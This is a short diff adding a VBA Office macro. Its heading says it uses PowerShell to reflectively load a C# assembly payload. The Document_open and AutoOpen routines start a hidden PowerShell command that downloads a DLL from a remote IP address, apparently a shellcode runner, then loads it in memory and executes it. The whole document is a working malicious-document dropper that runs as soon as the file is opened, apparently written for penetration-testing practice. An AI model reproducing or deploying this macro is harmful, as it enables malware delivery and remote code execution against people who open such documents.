@@ -1,0 +1,21 @@
+#### Use powershell in a macro to reflectively load a C# assembly payload
+Sub Document_open()
+runner
+
+End Sub
+
+Sub AutoOpen()
+runner
+
+End Sub
+
+Sub runner()
+
+Dim str As String
+str = "powershell.exe -c $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.49.52:8000/ShellCodeRunners/CSShellcodeRunner/ClassLibrary1/bin/Release/ClassLibrary1.dll'); $assem = [System.Reflection.Assembly]::Load($data); $class = $assem.GetType('ClassLibrary1.Class1'); $method = $class.GetMethod('runner'); $method.Invoke(0, $null)"
+Shell str, vbHide
+
+End Sub
+
+####
+
